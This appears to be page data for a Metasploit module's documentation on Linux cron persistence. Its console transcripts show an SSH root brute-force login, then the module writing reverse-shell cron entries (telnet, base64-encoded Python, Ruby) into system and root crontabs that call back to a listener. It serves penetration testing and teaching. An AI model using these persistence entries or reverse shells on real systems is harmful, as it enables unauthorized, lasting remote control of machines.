{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/local/cron_persistence","result":{"data":{"moduleMetadataJson":{"id":"9a28615e-8580-5c0d-be0b-d37a9b699b09","name":"Cron Persistence","fullname":"exploit/linux/local/cron_persistence","description":"This module will create a cron or crontab entry to execute a payload.\n          The module includes the ability to automatically clean up those entries to prevent multiple executions.\n          syslog will get a copy of the cron entry.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/local/cron_persistence","documentationSlug":"/modules/documentation/exploit/linux/local/cron_persistence","referencesSlug":"/modules/references/exploit/linux/local/cron_persistence"},"documentation":{"html":"<h3 id=\"creating-a-testing-environment\" style=\"position:relative;\"><a href=\"#creating-a-testing-environment\" aria-label=\"creating a testing environment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Creating A Testing Environment</h3>\n<p>This module has been tested against:</p>\n<ol>\n<li>Kali Rolling</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Exploit a box via whatever method</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/local/cron_persistence</code></li>\n<li>Do: <code class=\"language-text\">set session #</code></li>\n<li>Do: <code class=\"language-text\">set target #</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Optional Do: <code class=\"language-text\">set username</code> (depends on target selection)</li>\n<li>Optional Do: <code class=\"language-text\">set cleanup false</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>username</strong></p>\n<p>  Set a specific user's crontab if target 'User Crontab' is selected</p>\n<p>  <strong>timing</strong></p>\n<p>  Set cron's timing.  Default is to run within a minute.  If this is changed, WfsDelay should be adjusted to compensate</p>\n<p>  <strong>cleanup</strong></p>\n<p>  After the delayed period, use either perl (User/System Crontab) or standard MSF functionality to remove the cron entry.  <strong>THIS WILL STOP THE PERSISTENCE!!!</strong></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"kali-rolling-root\" style=\"position:relative;\"><a href=\"#kali-rolling-root\" aria-label=\"kali rolling root permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kali Rolling (root)</h3>\n<p>Initial Access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set username root\nusername =&gt; root\nmsf auxiliary(ssh_login) &gt; set password password\npassword =&gt; password\nmsf auxiliary(ssh_login) &gt; set rhosts 10.10.60.168\nrhosts =&gt; 10.10.60.168\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] 10.10.60.168:22 SSH - Starting bruteforce\n[+] 10.10.60.168:22 SSH - Success: &#39;root:password&#39; &#39;uid=0(root) gid=0(root) groups=0(root) Linux kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2 (2015-03-02) i686 GNU/Linux &#39;\n[*] Command shell session 1 opened (10.10.60.168:50618 -&gt; 10.10.60.168:22) at 2016-06-20 09:48:14 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Run our module (Cron)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use exploit/linux/local/cron_persistence\nmsf exploit(cron_persistence) &gt; set session 1\nsession =&gt; 1\nmsf exploit(cron_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(cron_persistence) &gt; set target 0\ntarget =&gt; 0\nmsf exploit(cron_persistence) &gt; exploit\n\n[*] Started reverse double handler\n[*] Max line length is 65537\n[*] Writing 152 bytes in 1 chunks of 518 bytes (octal-encoded), using printf\n[+] Writing * * * * * root sh -c &#39;(sleep 3867|telnet 10.10.60.168 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 10.10.60.168 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)&#39; #bAeBQqUYeb to /etc/cron.d/FiThkldAZR\n[*] Waiting 90sec for callback\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo xPBXQvodQdzgByKR;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;xPBXQvodQdzgByKR\\r\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 2 opened (10.10.60.168:4444 -&gt; 10.10.60.168:45087) at 2016-06-20 13:04:02 -0400\n[+] Deleted /etc/cron.d/FiThkldAZR</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Run our module (System Crontab)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use exploit/linux/local/cron_persistence\nmsf exploit(cron_persistence) &gt; set payload cmd/unix/reverse_python\npayload =&gt; cmd/unix/reverse_python\nmsf exploit(cron_persistence) &gt; set lhost 192.168.199.128\nlhost =&gt; 192.168.199.128\nmsf exploit(cron_persistence) &gt; set session 1\nsession =&gt; 1\nmsf exploit(cron_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(cron_persistence) &gt; set target 2\ntarget =&gt; 2\nmsf exploit(cron_persistence) &gt; set cleanup false\ncleanup =&gt; false\nmsf exploit(cron_persistence) &gt; exploit\n\n[*] Started reverse handler on 192.168.199.128:4444 \n[*] Max line length is 65537\n[*] Writing 1326 bytes in 1 chunks of 4969 bytes (octal-encoded), using printf\n[+] Writing * * * * * root python -c &quot;exec(&#39;aW1wb3J0IHNvY2tldCAgICwgICAgICAgc3VicHJvY2VzcyAgICwgICAgICAgb3MgICAgICAgOyAgICAgaG9zdD0iMTkyLjE2OC4xOTkuMTI4IiAgICAgICA7ICAgICBwb3J0PTQ0NDQgICAgICAgOyAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgLCAgICAgICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgIHMuY29ubmVjdCgoaG9zdCAgICwgICAgICAgcG9ydCkpICAgICAgIDsgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgICAgICAgMCkgICAgICAgOyAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAgICAgICAxKSAgICAgICA7ICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsICAgICAgIDIpICAgICAgIDsgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#39;.decode(&#39;base64&#39;))&quot; #SnwfsUhNys to /etc/crontab\n[*] Waiting 90sec for callback\n[*] Command shell session 2 opened (192.168.199.128:4444 -&gt; 192.168.199.128:54837) at 2016-06-20 13:24:01 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>And since we didn't clean up, if our session dies...</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">^C\nAbort session 2? [y/N]  y\n\n[*] 10.10.60.168 - Command shell session 2 closed.  Reason: User exit\nmsf exploit(cron_persistence) &gt; use exploit/multi/handler \nmsf exploit(handler) &gt; set payload cmd/unix/reverse_python\npayload =&gt; cmd/unix/reverse_python\nmsf exploit(handler) &gt; set lhost 192.168.199.128\nlhost =&gt; 192.168.199.128\nmsf exploit(handler) &gt; exploit\n\n[*] Started reverse handler on 192.168.199.128:4444 \n[*] Starting the payload handler...\n[*] Command shell session 3 opened (192.168.199.128:4444 -&gt; 192.168.199.128:54842) at 2016-06-20 13:27:01 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Run our module (User Crontab)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(cron_persistence) &gt; set payload cmd/unix/reverse_ruby\npayload =&gt; cmd/unix/reverse_ruby\nmsf exploit(cron_persistence) &gt; set lhost 192.168.199.128\nlhost =&gt; 192.168.199.128\nmsf exploit(cron_persistence) &gt; set session 1\nsession =&gt; 1\nmsf exploit(cron_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(cron_persistence) &gt; set target 1\ntarget =&gt; 1\nmsf exploit(cron_persistence) &gt; exploit\n\n[*] Started reverse handler on 192.168.199.128:4444 \n[*] Max line length is 65537\n[*] Writing 1247 bytes in 1 chunks of 4566 bytes (octal-encoded), using printf\n[+] Writing * * * * * ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;192.168.199.128&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39; #IiWAtaIrHs to /var/spool/cron/crontabs/root\n[*] Reloading cron to pickup new entry\n[*] Waiting 90sec for callback\n[*] Command shell session 2 opened (192.168.199.128:4444 -&gt; 192.168.199.128:55031) at 2016-06-20 14:22:01 -0400</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"9a28615e-8580-5c0d-be0b-d37a9b699b09"}}}